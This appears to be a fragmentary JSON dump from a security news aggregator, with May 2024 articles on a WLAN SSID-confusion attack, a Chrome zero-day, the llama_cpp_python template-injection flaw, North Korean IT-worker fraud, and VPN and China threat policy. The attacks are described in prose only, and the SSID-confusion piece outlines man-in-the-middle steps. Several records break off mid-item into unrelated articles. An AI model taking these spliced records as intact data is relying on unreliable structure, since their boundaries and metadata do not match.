"Nozomi Networks", "tag_type": "ORG"}, "Romanian": {"name": "Romanian", "tag_type": "MISC"}, "VPN": {"name": "VPN", "tag_type": "MISC"}, "Wyze": {"name": "Wyze", "tag_type": "ORG"}, "phishing": {"name": "phishing", "tag_type": "Cybersecurity"}, "ransomware": {"name": "ransomware", "tag_type": "Cybersecurity"}}, "title": "Researchers Uncover 11 Security Flaws in GE HealthCare Ultrasound Machines"}, {"attributes": [{"created": "2024-05-16T17:08:54.000961", "id": "f6775d6c-3cc9-4788-8e67-3c35fa698882", "key": "WORDLIST_BOT", "value": "1"}, {"created": "2024-05-16T17:15:24.100714", "id": "04420311-71b0-4e81-b518-5eae08f0a8ae", "key": "NLP_BOT", "value": "7"}], "created": "2024-05-16T15:42:00", "id": "8dc9db51-bc66-42eb-be68-f6e307ee7bac", "news_items": [{"author": "Dirk Knop", "content": "WLAN-Attacke: SSID-Verwechslungs-Angriff macht Nutzer verwundbar\nEine Sicherheitsl\u00fccke in WLAN-Protokollen f\u00fchrt dazu, dass Angreifer in einer Man-in-the-Middle-Position WLAN-Verkehr manipulieren k\u00f6nnen.\nEine neue WLAN-Schwachstelle hat Professor Mathy Vanhoef entdeckt, der auch schon Sicherheitsl\u00fccken wie TunnelCrack, KRACK Attack oder Dragonblood aufgesp\u00fcrt hat. Es handelt sich um eine \"SSID Confusion\"-Sicherheitsl\u00fccke (SSID-Verwechslung).\nVereinfacht funktioniert ein solcher Angriff so, dass ein b\u00f6sartiger Akteur die SSID des Zielnetzes f\u00e4lscht und dann Verbindungen \u00fcber sich umleitet, sodass die Clients sich beim gef\u00e4lschten Access Point anmelden. Sofern ein Opfer ein vertrauensw\u00fcrdiges Netzwerk verbinden m\u00f6chte und ein zweites Netzwerk mit denselben Authentifizierungsdaten \u2013 etwa ein WLAN-Mesh \u2013 verf\u00fcgbar sind, ist eine Attacke m\u00f6glich. Danach steht Angreifern der gesamte Netzwerkverkehr offen: nicht verschl\u00fcsselte Verbindungen lassen sich einsehen und weitere Angriffe auf Opfer einleiten. Angreifer k\u00f6nnten etwa versuchen, so Malware einzuschleusen.\nDer SSID-Confusion-Angriff\nEtwas detaillierter sieht das Angriffsszenario folgenderma\u00dfen aus: Ein Angreifer in einer Man-in-the-Middle-Position f\u00e4ngt die WLAN-Pakete zwischen dem echten Access Point (AP) und des WLAN-Clients des Opfers ab, die beim normalen Netzwerkscan auftreten. Er ver\u00e4ndert die SSIDs des vertrauensw\u00fcrdigen Netzes mit der des \"b\u00f6sartigen\" Netzes, bevor er sie an die urspr\u00fcnglichen Ziele weiterleitet. Das Opfer sieht Antwortpakete, die scheinbar vom vertrauensw\u00fcrdigen Netzwerk stammen, obwohl es sich um den b\u00f6sartigen AP des Angreifers handelt.\nBei einer Authentifizierung f\u00e4ngt der Angreifer die Pakete des Opfers ab und ersetzt die SSID des vertrauensw\u00fcrdigen Netzes durch das falsche Netz, bevor er sie an den echten AP weiterleitet und so die Authentifizierung vervollst\u00e4ndigt. Was nun passiert, h\u00e4ngt vom verwendeten WLAN-Protokoll ab \u2013 solange jedoch die SSID nicht in den PMK-Ableitungsprozess (Pairwise Master Key) einflie\u00dft, gelingt der Angriff. An dieser Stelle k\u00f6nnen Angreifer allen Verlehr des Opfers abfangen, umschreiben und an den echten AP weiterleiten.\nNicht alle WLAN-Protokolle sind anf\u00e4llig f\u00fcr den Angriff, etwa, weil bei ihnen die SSID in den Pairwise Master Key (PMK) einflie\u00dft. Als sicher stuft Vanhoef WPA1 und WPA2 ein, oder die FT-Authentifizierung. Das ohnehin nicht mehr sicher zu nutzende WEP ist anf\u00e4llig, und das neuere, sonst sicherere WPA3 ebenfalls. 802.11X/EAP und Mesh-Netzwerke mit AMPE-Authentifizierung sind laut Auflistung ebenfalls f\u00fcr SSID-Confusion verwundbar.\nSchutz vor SSID-Verwechselung-Attacken\nIn der \u00dcbersicht zur SSID-Confusion-Sicherheitsl\u00fccke nennen die Autoren auch potenzielle Gegenma\u00dfnahmen, um vor Attacken zu sch\u00fctzen. Dazu geh\u00f6ren \u00c4nderungen in den WLAN-Standards \u2013 Wi-Fi 7 bringe die Option des Beacon-Schutzes mit, der solche Angriffe vereitelt. Konkret k\u00f6nnen Netzwerk-Admins aber die Wiederbenutzung von Zugangsdaten zwischen SSIDs unterbinden. Enterprise-Netze sollten eigene CommonNames bei der Radius-Authentifizierung nutzen, im Heimnetzwerk helfe f\u00fcr jede SSID ein eigenes Zugangspasswort.

The three workers' manager, who used the aliases Zhonghua and Venechor S, is listed as an un-indicted co-conspirator.\n\u201cThese individuals engaged in a scheme that enabled Han, Jin, and Xu to obtain illicit telework employment with U.S. companies using false identities belonging to more than 60 real U.S. persons. The illicit scheme generated at least $6.8 million for the DPRK,\u201d the State Department said.\nThe scheme \"impacted more than 300 U.S. companies, caused false information to be conveyed to the Department of Homeland Security on more than 100 occasions, created false tax liabilities for more than 35 U.S. persons,\" the DOJ said.\nThe three workers \"are linked to the DPRK\u2019s Munitions Industry Department, which oversees the development of the DPRK\u2019s ballistic missiles, weapons production, and research and development programs,\" the State Department said.\nThe department said the workers tried to get hired at two unnamed U.S. government agencies but failed.\nChapman allegedly helped them acquire the identities of the 60 U.S. citizens and \u201creceived and hosted\u201d the laptop computers sent from employers in an effort to make it look like the North Koreans were based in the United States, the State Department said.\nChapman enabled the workers to connect remotely to the U.S. companies\u2019 IT networks on a daily basis and \u201chelped launder the proceeds from the scheme by receiving, processing, and distributing paychecks from the U.S. firms to these IT workers and others.\u201d\nDidenko \"allegedly owned and operated U.S.-based online infrastructure as well as fraudulent and stolen U.S. persons\u2019 identities\" in the scheme, said FBI Assistant Director Jim Smith of the New York Field Office.\nThe State Department urged anyone with information on Chapman, Han, Jin and Xu to come forward. The FBI also released an alert about North Korean IT workers.\nEvading sanctions\nLast year, the U.S. Treasury announced sanctions on four entities that employ thousands of North Korean IT workers who help illicitly finance the regime's missile and weapons of mass destruction programs.\nThe department said North Korea maintains legions of \u201chighly skilled\u201d IT workers around the globe, primarily in China and Russia, who \u201cgenerate revenue that contributes to its unlawful WMD and ballistic missile programs.\u201d\nThese individuals, who can earn up to $300,000 annually, \u201cdeliberately obfuscate their identities, locations, and nationalities, typically using fake personas, proxy accounts, stolen identities, and falsified or forged documentation\u201d to apply for jobs, Treasury said.\nBrian Nelson, undersecretary of the Treasury for terrorism and financial intelligence, said last year that the DPRK\u2019s \u201cextensive illicit cyber and IT worker operations\u201d help \u201cfinance the regime\u2019s unlawful weapons of mass destruction and ballistic missile programs.\u201d\nSeveral U.S. law enforcement agencies and international organizations have warned in recent years of North Korean IT workers posing as citizens from other countries to obtain work.

And their cousins, the Numechron clocks? Those wheels, especially the hours wheel, are really big compared to the size of what they display, so the clock housings are huge by comparison.\n[shiura] decided to re-invent the digital display and came up with this extremely cool spinning flap mechanism that uses a lip to flip each flap after it is shown. Thanks to this design, only half the number of flaps are needed. Not only is the face of the clock able to be much larger compared to the overall size of the thing, the whole unit is quite shallow. Plus, [shiura] tilted the display 15\u00b0 for better visibility.\nIf you want to build one of these for yourself, [shiura] has all the STLs available and some pretty great instructions. Besides the printed parts, you don\u2019t need much more than the microcontroller of your choice and a stepper motor.

The update includes a range of patches to security flaws, including a zero-day exploit called CVE-2024-4947. Zero-day exploits are vulnerabilities in software that malicious actors may know about and can easily target users because the software maker has yet to patch the flaw. And if that sounds familiar, it's because Google released another patch last week to fix another zero-day exploit.\nAlso: Meet Hackbat: An open-source, more powerful Flipper Zero alternative\nCVE-2024-4947 refers to \"Type Confusion in V8\" Javascript. The flaw, which was discovered by security researchers Vasily Berdnikov and Boris Larin at security company Kaspersky, could enable hackers to target individual users and cause their browsers to crash. It could also be used to execute code that could put their data at risk.\nFor its part, Google shared a few precious details about the flaw, saying instead that \"access to bug details and links may be kept restricted until a majority of users are updated with a fix.\" The company added that it's \"aware that an exploit for CVE-2024-4947 exists in the wild,\" but it stopped short of providing details.\nHowever, it gets worse. In addition to Google's Chrome, the flaw also affects Microsoft's Edge browser because it's based on the same Chromium technology as Chrome. In a statement on Wednesday, Microsoft said that it's working on a fix and echoed Google's sentiment.\nAlso: The best VPN services of 2024: Expert tested and reviewed\n\"Microsoft is aware of the recent exploits existing in the wild,\" the company wrote on its website. \"We are actively working on releasing a security fix.\"\nAll Edge users can do is sit and wait for Microsoft to release that update and patch their browsers as quickly as possible. For Chrome users, however, it's time to immediately update their browsers.\nFor starters, it's important to know which version of Chrome you're currently running. To determine that, click on the \"About Google Chrome\" option in your browser. On a Windows machine, you can check that by choosing \"Settings\" > \"About Google Chrome.\" On a Mac, it's as simple as clicking on the Chrome option at the top of your screen and choosing \"About Google Chrome.\"\nAlso: Security researchers say this scary exploit could render all VPNs useless\nOnce there, Google will let you know which version of Chrome you're running and if it's not the latest version, it'll automatically download Chrome 125. From there, simply choose the \"Relaunch\" option to restart your browser and ensure your machine is patched.\nGoogle said that its Chrome 125 update will be rolling out \"over the coming days/weeks,\" but it was available on Chrome software I was running on multiple devices.

This is the potential risk posed by CVE-2024-34359. This critical vulnerability affects the popular llama_cpp_python package, which is used for integrating AI models with Python. If exploited, it could allow attackers to execute arbitrary code on your system, compromising data and operations. Over 6,000 models on Hugging Face were potentially vulnerable, highlighting the broad and severe impact this could have on businesses, developers, and users alike. This vulnerability underscores the fact that AI platforms and developers have yet to fully catch up to the challenges of supply chain security.\nUnderstanding Jinja2 and llama_cpp_python\nJinja2: This library is a popular Python tool for template rendering, primarily used for generating HTML. Its ability to execute dynamic content makes it powerful but can pose a significant security risk if not correctly configured to restrict unsafe operations.\n`llama_cpp_python`: This package integrates Python's ease of use with C++'s performance, making it ideal for complex AI models handling large data volumes. However, its use of Jinja2 for processing model metadata without enabling necessary security safeguards exposes it to template injection attacks.\n[image: jinja and llama]\nWhat is CVE-2024-34359?\nCVE-2024-34359 is a critical vulnerability stemming from the misuse of the Jinja2 template engine within the `llama_cpp_python` package. This package, designed to enhance computational efficiency by integrating Python with C++, is used in AI applications. The core issue arises from processing template data without proper security measures such as sandboxing, which Jinja2 supports but was not implemented in this instance. This oversight allows attackers to inject malicious templates that execute arbitrary code on the host system.\nThe Implications of an SSTI Vulnerability\nThe exploitation of this vulnerability can lead to unauthorized actions by attackers, including data theft, system compromise, and disruption of operations. Given the critical role of AI systems in processing sensitive and extensive datasets, the impact of such vulnerabilities can be widespread, affecting everything from individual privacy to organizational operational integrity.\nThe Risk Landscape in AI and Supply Chain Security\nThis vulnerability underscores a critical concern: the security of AI systems is deeply intertwined with the security of their supply chains. Dependencies on third-party libraries and frameworks can introduce vulnerabilities that compromise entire systems. The key risks include:\nExtended Attack Surface: Integrations across systems mean that a vulnerability in one component can affect connected systems.\n-\nData Sensitivity: AI systems often handle particularly sensitive data, making breaches severely impactful.\n-\nThird-party Risk: Dependency on external libraries or frameworks can introduce unexpected vulnerabilities if these components are not securely managed.\n-\nA Growing Concern\nWith over 6,000 models on the HuggingFace platform using `gguf` format with templates\u2014thus potentially susceptible to similar vulnerabilities\u2014the breadth of the risk is substantial. This highlights the necessity for increased vigilance and enhanced security measures across all platforms hosting or distributing AI models.\nMitigation\nThe vulnerability identified has been addressed in version 0.2.72 of the llama-cpp-python package, which includes a fix enhancing sandboxing and input validation measures. Organizations are advised to update to this latest version promptly to secure their systems.\nConclusion\nThe discovery of CVE-2024-34359 serves as a stark reminder of the vulnerabilities that can arise at the confluence of AI and supply chain security. It highlights the need for vigilant security practices throughout the lifecycle of AI systems and their components. As AI technology becomes more embedded in critical applications, ensuring these systems are built and maintained with a security-first approach is vital to safeguard against potential threats that could undermine the technology's benefits.", "hash": "838df82ddf5a79ce9cccd9deec3ebbca813a05315de4f562e4010a6ba82c19f5", "id": "b4e85620-167f-41d0-8b14-eab6ec63c068", "link": "https://checkmarx.com/blog/llama-drama-critical-vulnerability-cve-2024-34359-threatening-your-software-supply-chain/", "osint_source_id": "b7ba0cc0-223f-48a4-b4d4-36cb93d24fdf", "published": "2024-05-16T15:21:11", "source": "https://checkmarx.com/feed/", "story_id": "25415109-33b7-440d-be48-90e55f2c3f36", "title": "Llama Drama: Critical Vulnerability CVE-2024-34359 Threatening Your Software Supply Chain"}], "tags": {"CVE-2024-34359": {"name": "CVE-2024-34359", "tag_type": "cves"}, "HTML": {"name": "HTML", "tag_type": "MISC"}, "Python": {"name": "Python", "tag_type": "MISC"}, "supply chain": {"name": "supply chain", "tag_type": "Cybersecurity"}}, "title": "Llama Drama: Critical Vulnerability CVE-2024-34359 Threatening Your Software Supply Chain"}, {"attributes": [{"created": "2024-05-16T17:25:47.174679", "id": "095d8c20-cee4-45cb-90b7-ea20118ac522", "key": "NLP_BOT", "value": "8"}], "created": "2024-05-16T15:20:00", "id": "3927b5a0-44da-474d-92f2-db3c39b5b7bb", "news_items": [{"author": "msmash", "content": "Visa Adds New Way To Share Customer Shopping Data With Retailers (bloomberg.com) 18\nVisa is rolling out new technology that will allow the payments giant to share more information about customers' preferences [non-paywalled source] based on their shopping history with retailers as it seeks to remain a top player in the competitive e-commerce space.

NCSC recommends Internet Protocol Security (IPsec) with Internet Key Exchange (IKEv2),\" reads the NCSC announcement.\nWhile the cybersecurity organization admits IPsec with IKEv2 isn't free of flaws, it believes switching to it would significantly reduce the attack surface for secure remote access incidents due to having reduced tolerance for configuration errors compared to SSLVPN.\nThe proposed implementation measures include:\nReconfiguring existing VPN solutions or replacing them\n-\nMigrating all users and systems to the new protocol\n-\nDisabling SSLVPN functionality and blocking incoming TLS traffic\n-\nUsing certificate-based authentication\n-\nWhere IPsec connections are not possible, the NCSC suggests using 5G broadband instead.\nMeanwhile, NCSC has also shared interim measures for organizations whose VPN solutions do not offer the IPsec with IKEv2 option and need time to plan and execute the migration.\nThese include implementing centralized VPN activity logging, strict geofencing restrictions, and blocking access from VPN providers, Tor exit nodes, and VPS providers.\nOther countries have also recommended using IPsec over other protocols, including the USA and the UK.\nAn abundance of exploited SSLVPN flaws\nUnlike IPsec, which is an open standard that most companies follow, SSLVPN does not have a standard, causing network device manufacturers to create their own implementation of the protocol.\nHowever, this has led to numerous bugs discovered over the years in SSL VPN implementations from Cisco, Fortinet, and SonicWall that hackers actively exploit to breach networks.\nAs an example, Fortinet revealed in February that the Chinese Volt Typhoon hacking group exploited two FortiOS SSL VPN flaws to breach organizations, including a Dutch military network.\nIn 2023, the Akira and LockBit ransomware operations exploited an SSL VPN zero-day in Cisco ASA routers to breach corporate networks, steal data, and encrypt devices.\nEarlier that year a Fortigate SSL VPN vulnerability was exploited as a zero-day against government, manufacturing, and critical infrastructure.\nNCSC's recommendations come after the organization recently alerted about an advanced threat actor exploiting multiple zero-day vulnerabilities in Cisco ASA VPNs used in critical infrastructure since November 2023.\nCisco disclosed the particular campaign as 'ArcaneDoor,' attributing it to the threat group tracked as 'UAT4356' or 'STORM-1849,' who gained unauthorized access to WebVPN sessions associated with the device's SSL VPN services.\nThe attacks involved the exploitation of two zero-days, namely CVE-2024-20353 and CVE-2024-20359, which enabled the hackers to achieve authentication bypass, device takeover, and privilege elevation to administrative rights.\nAlthough Cisco fixed the two vulnerabilities on April 24, the cybersecurity and networking equipment firm couldn't identify how the threat actors initially gained access to the device.\nComments\nrgreen83 - 4 hours ago\nThey are correct SSL VPN has proven to be an ongoing security risk. IPSec is too cumbersome and complicated for many scenarios where SSL is used though. IPSec should already be used for site to site static IP VPNs but SSL VPN should be replaced with Wireguard.", "hash": "18e630380d64cd798d12982091411a29d0bf47eacd0f8fa113fb537582f259a0", "id": "a17fd15e-5074-45c4-99b5-25b2067d0434", "link": "https://www.bleepingcomputer.com/news/security/norway-recommends-replacing-ssl-vpn-to-prevent-breaches/", "osint_source_id": "113d33c5-3471-4d83-bd72-2ea6658a4e49", "published": "2024-05-16T15:07:45", "source": "https://www.bleepingcomputer.com/feed/", "story_id": "db52093d-294d-48c7-81da-ba5290c3f6c9", "title": "Norway recommends replacing SSL VPN to prevent breaches"}], "tags": {"Bill Toulas": {"name": "Bill Toulas", "tag_type": "PER"}, "CVE-2024-20353": {"name": "CVE-2024-20353", "tag_type": "cves"}, "CVE-2024-20359": {"name": "CVE-2024-20359", "tag_type": "cves"}, "Cisco": {"name": "Cisco", "tag_type": "ORG"}, "Dutch": {"name": "Dutch", "tag_type": "MISC"}, "FortiNet": {"name": "FortiNet", "tag_type": "ORG"}, "Fortigate": {"name": "Fortigate", "tag_type": "MISC"}, "IKEv2": {"name": "IKEv2", "tag_type": "ORG"}, "IPsec": {"name": "IPsec", "tag_type": "MISC"}, "NCSC": {"name": "NCSC", "tag_type": "ORG"}, "Norway": {"name": "Norway", "tag_type": "Country"}, "SSLVPN": {"name": "SSLVPN", "tag_type": "ORG"}, "SonicWall": {"name": "SonicWall", "tag_type": "ORG"}, "UAT4356": {"name": "UAT4356", "tag_type": "MISC"}, "USA": {"name": "USA", "tag_type": "LOC"}, "VPN": {"name": "VPN", "tag_type": "MISC"}, "Volt Typhoon": {"name": "Volt Typhoon", "tag_type": "APT"}, "WebVPN": {"name": "WebVPN", "tag_type": "MISC"}, "ransomware": {"name": "ransomware", "tag_type": "Cybersecurity"}, "zero-day": {"name": "zero-day", "tag_type": "Cybersecurity"}}, "title": "Norway recommends replacing SSL VPN to prevent breaches"}, {"attributes": [{"created": "2024-05-16T17:23:02.348029", "id": "43584c7e-812b-439e-80ee-e998e5d0c194", "key": "NLP_BOT", "value": "2"}], "created": "2024-05-16T15:01:55", "id": "1fb7e181-bdce-4fb1-85fe-f3fab9ff2b93", "news_items": [{"author": "Brad Osborne", "content": "The Wordfence Affiliate Program Officially Launches Today\nToday, we are officially launching the Wordfence Affiliate Program.\nIf you love securing WordPress and are passionate about helping make the Web a safer place, click here to apply to the program now.\nThis is an exciting opportunity for us to give back to our incredible community who have been sharing Wordfence with their friends, clients, customers, and followers for over a decade.

Entworfen wurde die Megayacht f\u00fcr eine Familie, die dort eine Wohnung mit 2 Schlafzimmern bewohnen soll. Dazu kommen 2 Badezimmer, ein Ankleidezimmer, ein Fitnessraum, eine Vorratskammer, 2 B\u00fcros, die jeweils \u00fcber einen offenen Kamin verf\u00fcgen und ein gro\u00dfz\u00fcgiges Wohnzimmer.

Die fast 120 Meter lange Superyacht Project 821 wird aber mit Wasserstoff-Brennstoffzellen, Elektroantrieb und Biodiesel betrieben.\nYacht f\u00e4hrt nur kurz mit Brennstoffzellen\nInsgesamt wurden dazu 16 Brennstoffzellen integriert, die den Strom f\u00fcr die Maschinen und die Stromversorgung liefern sollen. Der Fl\u00fcssigwasserstoff wird bei -253 Grad Celsius in Tanks gelagert, die 4 Tonnen davon speichern k\u00f6nnen. Ein zus\u00e4tzlicher Akku speichert 543 Kilowattstunden an Strom. Neben elektrisch erzeugtem Strom wird auch die Abw\u00e4rme genutzt, um damit den integrierten Swimming Pool und die Fu\u00dfb\u00f6den zu heizen.\nDer Wasserstoff w\u00fcrde allerdings nicht f\u00fcr l\u00e4ngere Ausfahrten reichen. Er kann die Yacht nur eine Woche lang versorgen, wenn sie vor Anker liegt oder um einmal mit einer Geschwindigkeit von 10 Knoten (18,52 km/h) aus dem Hafen zu fahren. F\u00fcr l\u00e4ngere Ausfahrten muss dann der mit Biodiesel betriebene Generator angeworfen werden.\nNeue Schiffe in Norwegen\nDer Hersteller Feadship will damit die Verwendung von nachhaltigen Technologien auf Superyachten vorantreiben \u2013 bis 2030 will das Unternehmen Yachten bauen, die keinerlei Emissionen mehr aussto\u00dfen. Wie nachhaltig Project 821 in Anbetracht der geringen Wasserstoff-Reicheweite tats\u00e4chlich ist - vor allem in Anbetracht des \u00fcbrigen Luxuslebens der Yachtbewohner*innen - ist jedoch hinterfragenswert. Bis 2026 will Feadship auch eine Passagier- und eine Autof\u00e4hre f\u00fcr den Langstreckenbetrieb in Norwegen in Betrieb nehmen.\nKommentare", "hash":

"news_items": [{"author": "Connor Jones", "content": "Stifling Beijing in cyberspace is now British intelligence\u2019s number-one mission\nAnnual conference of cyber intel unit shows UK's alarm over China blaring louder than ever\nRegular attendees of CYBERUK, the annual conference hosted by British intelligence unit the National Cyber Security Centre (NCSC), will know that in addition to the expected conference panels, there is usually an interwoven theme to proceedings.\nLast year the tech-security operatives' event revolved around \"securing an open and resilient digital future\", and the underlying message of this year's strapline wasn't much different: \"Future Tech, Future Threat, Future Ready.\"\nThere certainly was a future feel to this year's event. Various discussions around the future of security technology attracted some of the biggest names in the field to the stage at Birmingham's ICC \u2013 those focused on AI and post-quantum cryptography particularly caught the eye. But, it was the future threat presented by, and potential future conflict with, China that prevailed as the event's true unspoken theme, seemingly seeping into nearly every discussion over the two-day all-things-cyber bash.\nMany will read this and think \"that makes sense\" given the recent increase in anti-China communications emerging from allied governments about the Middle Kingdom, and especially its Volt Typhoon band of state-sponsored cyberspies.\nFor the past two years, however, the event has felt decidedly Russia-y, despite not explicitly being themed around it. In 2022, it was all about the Ukraine war, naturally. Russia was again a watchword last year but with more of a focus on the threat Putin's country, and those who support it, poses to allied critical national infrastructure (CNI).\nOf course, Russia is still Russia and it got its moment on day one. GCHQ director Anne Keast-Butler's (AKB) opening speech hinted at the types of curiosities UK intelligence has spotted in Putinland over the past 12 months, including closer ties to the criminal underworld. Others at the event suggested the Kremlin may be hiding behind these proxies for plausible deniability of attacks.\n\"We are increasingly concerned about growing links between the Russian intelligence services and proxy groups and sabotage operations,\" she said.\n\"Before, Russia simply created the right environments for these groups to operate, but now they are nurturing and inspiring these non-state cyber operations\u2026 and in some cases seemingly co-ordinating physical attacks against the West.\n\"The Russia threat is acute and globally pervasive. It requires constant vigilance and collaboration to defeat it.\"\nThat said, Putin was barely spotlit this year. That's not to say Russia is in the background \u2013 far from it \u2013 but more of a focus is being placed on China and the \"epoch-defining challenge\" (NCSC loves this wording) it presents.\nThis year's CYBERUK flock of delegates would have been pushed to attend more than a single session that didn't have a China flavor. While Beijing's ambition for tech dominance is well-documented, the People's Republic of China (PRC) is very clearly occupying the headspace of national security officials more than ever.\nAKB went so far as to say more resources are being spent on tackling China than any other single mission at GCHQ, if you needed any more of a sense of just how seriously it's being taken.\nIt's a major U-turn on the agency's attitudes toward cybersecurity from as recently as 2021, when former NCSC CEO Lindy Cameron said ransomware was the foremost threat to the UK.\nThe people of China have contributed so much to the UK, AKB acknowledged, alongside its signing of the declaration on AI at Bletchley Park in November, but make no mistake: \"China poses a genuine and increasing cyber risk to the UK.\"\nBiden cranks up the heat on China with wall of tech tariffs\n-\nA Chinese crypto farm next to a nuclear missile base? Not on my watch, says Biden\n-\nChina's SMIC sounds alarm on price wars from silicon surplus\n-\nHuawei's woes really were just a flesh wound \u2013 profits just soared 564 percent\n-\n\"China has built an advanced set of cyber capabilities and is taking advantage of a growing commercial ecosystem of hacking outfits and data brokers at its disposal,\" said Butler.\n\"The PRC is looking to shape global technology standards in its own favor, seeking to assert its dominance within the next 10 to 15 years.\n\"Which is why the UK's intelligence community is working alongside our allies in the Five Eyes and beyond, and also in partnership with our industry and academic colleagues to deter and combat cyber threats from nation-states and hostile actors.\"\nIn the UK, APT31 is probably the best-known group of troublemakers-in-chief, having recently been outed for two major attacks on democracy, including the theft of Electoral Register data.\nVolt Typhoon will be the group more familiar to those in the US, especially after it was pinned to various attacks on CNI networks. The activity here is concerning not just given the sensitivity of the target, but how it illustrates a worrying evolution in tradecraft.\nXi's cyberspies ten years ago may have just been stealing intellectual property from universities, for example, but the attacks on CNI from multiple groups, not just Volt Typhoon, showed evidence of China trying to set themselves up for destructive attacks in the future.\nCouple this with China's 2021 data security law that requires all security vulnerabilities to be handed to Beijing before being disclosed, if at all, and the Middle Kingdom's intentions become much clearer.\nRussia is seen as the threat today\u2026 China is the threat of tomorrow. That's the main takeaway.\nThe resilience opportunity\nFollowers of NCSC and Five Eyes government cyber messaging will be familiar with their narrative that hammers home the point of needing to build a cyber-resilient nation.\nConsider again that 10-15-year timeframe AKB outlined regarding China's bid for tech dominance. While that appears to be a decently large enough lead to make some kind of intervention, the reason why \"resilience\" is being thrust down our throats is that in reality, if allied nations want to quell the threat of China, that window isn't as generous as it might sound.\nIndustry calls for vendors to take greater responsibility for the security of their products were being made many years ago, but as NCSC CTO Ollie Whitehouse said, the tech market is broken and he doesn't see material change happening for at least ten years.\nThe market is just one piece of the puzzle to solve within that limited time. The industry also needs to work more collaboratively to out-innovate China, which has scores of intelligence workers dedicated to learning Western cyber tradecraft, and consuming every blog post, article, and speech that offers a glimpse at how we might be countering their work, purely to devise an effective block.\nWhitehouse mentioned the need to incentivize boardrooms as well as vendors to assume liability for their security. When every organization is connected to something critical or otherwise sensitive in one way or another, the supply chain needs to be resilient so cyberspies can't shut down a city after breaching a small software vendor.\nThere's a limited window of opportunity to act to ensure the threat China presents doesn't escalate beyond control. That's clearly the thinking among intelligence agencies.\nChina doesn't just want to keep pace with the West, but achieve supremacy in cyberspace and out-innovate it to the extent Western nations can't defend against it.\n\"As the head of a world-leading tech organization and as a mathematician, it's clear that technology and security are more tightly coupled than ever before,\" Butler said.\n\"Collaboration across academia, the private and public sectors is crucial for developing cutting-edge science and technology solutions for national security.\n\"To quote the Foreign Secretary, who spoke at the NCSC's headquarters in London last week: we need to forge partnerships to out-cooperate and out-innovate our adversaries.\" \u00ae", "hash": "23aa90ad57fc3b56cd595b97f64733a7458d6c6ae3a3668647390768390598ea", "id": "b9e3a37c-91da-4e61-be10-dd1cf0e756fc", "link": "https://go.theregister.com/feed/www.theregister.com/2024/05/16/the_uks_alarm_over_china/", "osint_source_id": "a94d3f15-5689-470c-9d1f-670b8c63491d", "published": "2024-05-16T14:45:07", "source": "http://www.theregister.co.uk/security/headlines.atom", "story_id": "5183ec2f-33dc-411e-b1d3-958e9b2d1a11", "title": "Stifling Beijing in cyberspace is now British intelligence\u2019s number-one mission"}], "tags": {"AKB": {"name": "AKB", "tag_type": "ORG"}, "APT31": {"name": "APT31", "tag_type": "MISC"}, "Anne Keast-Butler": {"name": "Anne Keast-Butler", "tag_type": "PER"}, "BIRMINGHAM": {"name": "BIRMINGHAM", "tag_type": "LOC"}, "Beijing": {"name": "Beijing", "tag_type": "LOC"}, "Biden": {"name": "Biden", "tag_type": "PER"}, "Bletchley Park": {"name": "Bletchley Park", "tag_type": "LOC"}, "British": {"name": "British", "tag_type": "MISC"}, "Butler": {"name": "Butler", "tag_type": "PER"}, "CNI": {"name": "CNI", "tag_type": "ORG"}, "China": {"name": "China", "tag_type": "Country"}, "Chinese": {"name": "Chinese", "tag_type": "MISC"}, "CyberUK": {"name": "CyberUK", "tag_type": "MISC"}, "GCHQ": {"name": "GCHQ", "tag_type": "ORG"}, "ICC": {"name": "ICC", "tag_type": "ORG"}, "Kremlin": {"name": "Kremlin", "tag_type": "LOC"}, "Lindy Cameron": {"name": "Lindy Cameron", "tag_type": "PER"}, "London": {"name": "London", "tag_type": "LOC"}, "Middle Kingdom": {"name": "Middle Kingdom", "tag_type": "LOC"}, "NCSC": {"name": "NCSC", "tag_type": "ORG"}, "Ollie Whitehouse": {"name": "Ollie Whitehouse", "tag_type": "PER"}, "PRC": {"name": "PRC", "tag_type": "ORG"}, "Putin": {"name": "Putin", "tag_type": "PER"}, "Putinland": {"name": "Putinland", "tag_type": "LOC"}, "Russia": {"name": "Russia", "tag_type": "Country"}, "Russia-y": {"name": "Russia-y", "tag_type": "MISC"}, "Russian": {"name": "Russian", "tag_type": "MISC"}, "U-turn": {"name": "U-turn", "tag_type": "MISC"}, "Ukraine": {"name": "Ukraine", "tag_type": "Country"}, "Volt Typhoon": {"name": "Volt Typhoon", "tag_type": "APT"}, "Western": {"name": "Western", "tag_type": "MISC"}, "Whitehouse": {"name": "Whitehouse", "tag_type": "PER"}, "anti-China": {"name": "anti-China", "tag_type": "MISC"}, "ransomware": {"name": "ransomware", "tag_type": "Cybersecurity"}, "supply chain": {"name": "supply chain", "tag_type": "Cybersecurity"}}, "title": "Stifling Beijing in cyberspace is now British intelligence\u2019s number-one mission"}, {"attributes": [{"created": "2024-05-16T17:08:13.232784", "id": "9d295993-7b8e-43ea-83fa-238d7cfd365d", "key": "WORDLIST_BOT", "value": "3"}, {"created": "2024-05-16T17:13:08.081558", "id": "fe10e032-bda3-4f3d-b553-e2310bb3266b", "key": "NLP_BOT", "value": "19"}], "created": "2024-05-16T14:45:00", "id": "1d57c61c-ddeb-457a-becd-5aaf97d165b1", "news_items": [{"author": "Aktuelles aus dem BM.I", "content": "Aktuelles\nVerfassungsschutzbericht 2023: Konflikte n\u00e4hren Bedrohungen auch in \u00d6sterreich\nAktuelle geopolitische Verwerfungen st\u00e4rken die Radikalisierung und Polarisierung, dies hat konkrete Auswirkungen auf die Bedrohungslagen in \u00d6sterreich. Der Verfassungsschutz legte 2023 den Fokus auf extremistische Aktivit\u00e4ten sowie auf die Spionageabwehr.\nDer Verfassungsschutzbericht (VSB) wird j\u00e4hrlich von der Direktion Staatsschutz und Nachrichten-dienst (DSN) verfasst. Er behandelt die umfangreichen Aufgabengebiete des \u00f6sterreichischen Verfassungsschutzes sowie aktuelle Herausforderungen und m\u00f6gliche zuk\u00fcnftige Entwicklungen.\nEin zentrales Thema des VSB 2023 ist die geopolitische Lage, die mit dem russischen Angriffskrieg auf die Ukraine sowie dem Terrorangriff der Hamas auf Israel und der damit einhergehenden Eskalation der Sicherheitslage im Nahen Osten auch Auswirkungen auf den Verfassungsschutz in \u00d6sterreich hatte und hat. Im Fokus des Verfassungsschutzes standen im Berichtsjahr vor allem extremis-tische Aktivit\u00e4ten sowie Spionageaktivit\u00e4ten.\n\"Wir stehen f\u00fcnf zentralen Herausforderungen gegen\u00fcber: dem islamistischen Extremismus, dem neuen und alten Antisemitismus, dem neuen und alten Rechtsextremismus, Spionage und Desinformation sowie gewaltbereiten und radikalen 